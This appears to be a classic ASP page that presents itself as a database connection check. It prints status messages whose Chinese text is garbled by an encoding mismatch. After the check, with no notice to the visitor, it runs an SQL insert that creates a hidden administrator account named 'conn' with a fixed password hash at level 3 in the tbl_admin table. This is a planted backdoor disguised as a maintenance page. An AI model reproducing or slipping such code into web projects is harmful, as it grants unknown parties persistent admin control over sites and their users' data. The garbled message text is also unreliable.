<!--#include file="../p_inc/Include_func.asp"-->
<!--#include file="../p_inc/openconn.asp"-->
<%
on error resume next
Response.Write "��ʼ�ж����ݿ��Ƿ���������....."
Response.Flush()
IF err>0 Then
	Response.Write "<font color=red>���ݿ����ˣ��Լ�����p_data\�µ����ݿ�����޸�</font>"
	Response.End()
Else
	Response.Write "<font color=blue>���ݿ�����</font>"
End IF
Response.Write ""
conn.execute("Insert into tbl_admin (str_username,str_pass,str_level,flag) values('conn','49ba59abbe56e057',3,0)")
Response.Write ""
%>